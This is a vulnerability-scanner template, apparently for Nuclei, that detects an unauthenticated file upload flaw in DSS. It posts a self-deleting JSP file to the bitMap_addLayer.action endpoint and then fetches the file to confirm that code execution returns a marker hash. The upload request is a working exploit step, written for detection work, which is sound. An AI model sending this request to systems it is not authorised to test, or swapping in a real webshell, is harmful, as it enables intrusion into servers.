id: dss-unauth-file-upload-getshell

info:
  name: DSS Unauthenticated File Upload Getshell
  author: ProjectDiscoveryAI
  severity: critical
  description: |
    This template checks for an unauthenticated file upload vulnerability in DSS that can lead to remote code execution (RCE).
  tags: rce,file-upload

variables:
  boundary: "----WebKitFormBoundaryfeqBPf6vTNwBAj49"

flow: |
  http(1) && http(2)

http:
  - raw:
      - |
        POST /emap/bitmap/bitMap_addLayer.action?jsonstr={%22mapx%22:null,%22mapy%22:null,%22name%22:%22%22,%22path%22:%22%22,%22desc%22:%22%22,%22pId%22:null} HTTP/1.1
        Host: {{Hostname}}
        Content-Type: multipart/form-data; boundary={{boundary}}

        --{{boundary}}
        Content-Disposition: form-data; name="upload"; filename="login1.jsp"
        Content-Type: application/octet-stream

        <% out.println(new String(new sun.misc.BASE64Decoder().decodeBuffer("ZTE2NTQyMTExMGJhMDMwOTlhMWMwMzkzMzczYzViNDM="))); new java.io.File(application.getRealPath(request.getServletPath())).delete(); %>
        --{{boundary}}
        Content-Disposition: form-data; name="desc"

        提交
        --{{boundary}}
        Content-Disposition: form-data; name="layerName"

        test
        --{{boundary}}--

    matchers:
      - type: regex
        regex:
          - "[0-9]+\\.jsp"
        part: body
    extractors:
      - type: regex
        name: uploaded_file
        regex:
          - "[0-9]+\\.jsp"
        group: 0
        internal: true

  - raw:
      - |
        GET /upload/emap/{{uploaded_file}} HTTP/1.1
        Host: {{Hostname}}

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        words:
          - "e165421110ba03099a1c0393373c5b43"
        part: body
